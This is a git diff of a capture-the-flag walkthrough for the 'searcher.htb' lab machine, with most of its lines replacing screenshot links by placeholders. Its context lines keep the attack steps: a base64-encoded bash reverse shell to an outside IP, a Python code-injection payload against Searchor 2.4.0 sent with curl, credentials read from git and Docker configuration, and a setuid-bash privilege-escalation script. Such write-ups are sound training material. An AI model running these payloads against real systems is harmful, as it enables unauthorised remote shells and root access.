@@ -12,9 +12,9 @@ export target=10.129.16.87
 sudo nmap -p- --min-rate 5000 -sT -vvv $target
 ```
 
-<img width="449" height="160" alt="image" src="https://github.com/user-attachments/assets/5804df0e-666b-4002-9e20-2f82959f89b4" />
+<img width="449" height="160" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-1-Upload-To-Imgur" />
 
-<img width="723" height="212" alt="image" src="https://github.com/user-attachments/assets/8d11256c-f59b-4b39-92e9-799eebc7c9c8" />
+<img width="723" height="212" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-2-Upload-To-Imgur" />
 
 **Results:**
 - Discovered open ports: **22 (SSH)** and **80 (HTTP)**
@@ -24,7 +24,7 @@ sudo nmap -p- --min-rate 5000 -sT -vvv $target
 sudo nmap -sC -sV -p 22,80 -T4 $target
 ```
 
-<img width="762" height="337" alt="image" src="https://github.com/user-attachments/assets/f8a1773c-d024-4c0e-bafe-a395be4197b8" />
+<img width="762" height="337" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-3-Upload-To-Imgur" />
 
 **Detailed Findings:**
 - **Port 22**: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
@@ -41,14 +41,14 @@ Visited `http://searcher.htb` and discovered:
 - **Software**: Searchor version 2.4.0
 - **Functionality**: Search engine aggregation tool
 
-<img width="948" height="977" alt="image" src="https://github.com/user-attachments/assets/71694e0a-1be9-4edc-a79f-3861fd2dd8b6" />
+<img width="948" height="977" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-4-Upload-To-Imgur" />
 
 ### Testing Search Functionality
 - Selected Google as search engine
 - Query "hello" returned: `https://www.google.com/search?q=hello`
 - Application reflected search results in a new webpage
 
-<img width="428" height="110" alt="image" src="https://github.com/user-attachments/assets/88cf8347-664b-4656-8ad5-6043a5ac0bcb" />
+<img width="428" height="110" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-5-Upload-To-Imgur" />
 
 ## Initial Access
 
@@ -64,7 +64,7 @@ echo -ne "bash -c 'bash -i >& /dev/tcp/10.10.14.172/4444 0>&1'" | base64
 # Output: YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcyLzQ0NDQgMD4mMSc=
 ```
 
-<img width="629" height="79" alt="image" src="https://github.com/user-attachments/assets/728fd3ea-c9f7-4e8d-984f-ea268714f317" />
+<img width="629" height="79" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-6-Upload-To-Imgur" />
 
 
 ### Craft Exploit Payload
@@ -72,7 +72,7 @@ echo -ne "bash -c 'bash -i >& /dev/tcp/10.10.14.172/4444 0>&1'" | base64
 evil_cmd="',__import__('os').system('echo YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcyLzQ0NDQgMD4mMSc= | base64 -d | bash -i')) # junky comment"
 ```
 
-<img width="949" height="237" alt="image" src="https://github.com/user-attachments/assets/d4eee6ca-aaf7-41f1-b2ea-f35a2933d844" />
+<img width="949" height="237" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-7-Upload-To-Imgur" />
 
 ### Start Netcat Listener
 ```bash
@@ -87,7 +87,7 @@ curl -s -X POST http://searcher.htb/search -d "engine=Google&query=${evil_cmd}"
 ### Shell Obtained
 Successfully received reverse shell connection as user `svc`
 
-<img width="637" height="942" alt="image" src="https://github.com/user-attachments/assets/da778b00-dc69-451a-9d47-a76352639132" />
+<img width="637" height="942" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-8-Upload-To-Imgur" />
 
 ## Privilege Escalation
 
@@ -107,7 +107,7 @@ ls -la
 cat /var/www/app/.git/config
 ```
 
-<img width="710" height="371" alt="image" src="https://github.com/user-attachments/assets/31d5c33d-d314-4d42-9cd6-aa3c31b8c94c" />
+<img width="710" height="371" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-9-Upload-To-Imgur" />
 
 **Found Credentials:**
 ```
@@ -126,9 +126,9 @@ echo "10.129.16.87 gitea.searcher.htb" >> /etc/hosts
 
 with codys creds we can login to http://gitea.searcher.htb/user/login?redirect_to=%2f
 
-<img width="953" height="533" alt="image" src="https://github.com/user-attachments/assets/e70db74c-80f5-4a86-8538-7e9471712299" />
+<img width="953" height="533" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-10-Upload-To-Imgur" />
 
-<img width="802" height="981" alt="image" src="https://github.com/user-attachments/assets/d81cf9e1-de99-46bb-83d7-9c8dafcdbd7d" />
+<img width="802" height="981" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-11-Upload-To-Imgur" />
 
 
 ### Check Sudo Privileges
@@ -136,7 +136,7 @@ with codys creds we can login to http://gitea.searcher.htb/user/login?redirect_t
 sudo -l
 ```
 Note:Use codys' password
-<img width="754" height="175" alt="image" src="https://github.com/user-attachments/assets/e1ab228f-2c9b-4ec6-9413-fe9373bf79c1" />
+<img width="754" height="175" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-12-Upload-To-Imgur" />
 
 **Output:**
 ```
@@ -168,7 +168,7 @@ Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
 ```
 
-<img width="959" height="175" alt="image" src="https://github.com/user-attachments/assets/9ee9e961-5827-4704-988e-a46285f16dbd" />
+<img width="959" height="175" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-13-Upload-To-Imgur" />
 
 **Results:**
 ```
@@ -181,7 +181,7 @@ f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   2 years ago   Up 
 ```bash
 sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
 ```
-<img width="581" height="222" alt="image" src="https://github.com/user-attachments/assets/54ee3014-9d49-474e-ac9f-f9b3f29a9cc3" />
+<img width="581" height="222" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-14-Upload-To-Imgur" />
 
 **Extracted Database Credentials from Environment:**
 ```json
@@ -201,7 +201,7 @@ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | 
 sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .
 ```
 
-<img width="955" height="376" alt="image" src="https://github.com/user-attachments/assets/6da02fd2-8068-4d04-933c-20b51824b031" />
+<img width="955" height="376" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-15-Upload-To-Imgur" />
 
 **Network Information:**
 ```json
@@ -232,14 +232,14 @@ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSetti
 mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
 ```
 
-<img width="660" height="572" alt="image" src="https://github.com/user-attachments/assets/d9ab3df2-6a82-4b75-b6e6-61830cf25bdc" />
+<img width="660" height="572" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-16-Upload-To-Imgur" />
 
 ### Extract User Information
 ```sql
 select * from users \G;
 ```
 
-<img width="951" height="787" alt="image" src="https://github.com/user-attachments/assets/85e15867-0150-422a-937b-7f3d013c5f14" />
+<img width="951" height="787" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-17-Upload-To-Imgur" />
 
 **Found Administrator Hash:**
 ```
@@ -255,7 +255,7 @@ Examined scripts in the Gitea repository maintained by administrator.
 ### Exploit Full-Checkup Vulnerability
 Discovered that `full-checkup` executes scripts from current directory with root privileges.
 
-<img width="951" height="890" alt="image" src="https://github.com/user-attachments/assets/8c883a57-d7ff-4327-8bd9-582b6e6c8924" />
+<img width="951" height="890" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-18-Upload-To-Imgur" />
 
 **Create Exploit Script:**
 ```bash
@@ -263,7 +263,7 @@ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/path\nchmod 4777 /tmp/path' > full-che
 chmod +x full-checkup.sh
 ```
 
-<img width="928" height="145" alt="image" src="https://github.com/user-attachments/assets/ee595de3-8347-44a6-b5a1-b391176b9ae1" />
+<img width="928" height="145" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-19-Upload-To-Imgur" />
 
 ### Execute Privilege Escalation
 ```bash
@@ -284,7 +284,7 @@ uname -r
 ```
 
 
-<img width="638" height="201" alt="image" src="https://github.com/user-attachments/assets/f27221c3-1fa7-464f-8ded-34b29916c56c" />
+<img width="638" height="201" alt="image" src="https://placehold.co/600x400/EEE/31343C?text=Image-20-Upload-To-Imgur" />
 
 ## Flag Collection
 
